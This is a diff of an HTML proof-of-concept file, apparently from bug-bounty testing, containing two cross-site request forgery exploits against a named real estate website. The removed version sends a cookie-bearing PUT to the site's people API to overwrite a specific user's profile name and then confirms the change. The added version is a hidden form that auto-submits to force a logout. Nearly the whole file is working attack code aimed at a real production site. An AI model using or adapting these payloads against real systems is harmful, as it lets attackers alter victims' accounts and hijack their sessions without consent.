@@ -1,59 +1,11 @@
 <html>
-<body>
-  <h2>CSRF Test - PUT Request (Fetch API)</h2>
-  <div id="result">Sending request...</div>
-  <script>
-    const userId = '693ed16f9c710900011748be';
-    const targetUrl = `https://www.compass.com/api/v3/people/${userId}`;
-
-    const maliciousJson = {
-      "person": {
-        "personId": userId,
-        "firstName": "CSRF_HACKED", // Change this to test
-        "lastName": "Hello",
-        "displayName": "First Account",
-        "selectedGeoId": "",
-        "createdAt": 1765724527497,
-        "updatedAt": 1765726298224,
-        "profile": { "customer": { "preferredContactMethod": 0 } },
-        "phone": "",
-        "roles": ["Renter"],
-        "active": true
-      }
-    };
-
-    fetch(targetUrl, {
-      method: 'PUT', // Direct PUT method
-      credentials: 'include', // Sends your cookies
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(maliciousJson)
-    })
-    .then(response => {
-      document.getElementById('result').innerHTML = 
-        `PUT request sent. HTTP Status: <strong>${response.status}</strong>`;
-      console.log('CSRF PUT attempt finished. Status:', response.status);
-      // Optional: Check if it really worked by fetching the profile
-      if (response.status === 200) {
-        fetch(`https://www.compass.com/api/v3/people/${userId}`, {
-          credentials: 'include'
-        })
-        .then(r => r.json())
-        .then(data => {
-          console.log('Updated profile:', data);
-          if(data.person.firstName === "CSRF_HACKED") {
-            document.getElementById('result').innerHTML += 
-              '<br><span style="color:red;">✅ CONFIRMED: Profile updated via CSRF!</span>';
-          }
-        });
-      }
-    })
-    .catch(err => {
-      document.getElementById('result').innerHTML = 
-        `Error: ${err}`;
-      console.error('CSRF fetch failed:', err);
-    });
-  </script>
-</body>
+  <body>
+    <h2>CSRF Logout PoC (POST)</h2>
+    <form id="csrfForm" action="https://www.compass.com/logout" method="POST">
+      <input type="hidden" name="source" value="account_page">
+    </form>
+    <script>
+      document.getElementById('csrfForm').submit();
+    </script>
+  </body>
 </html>
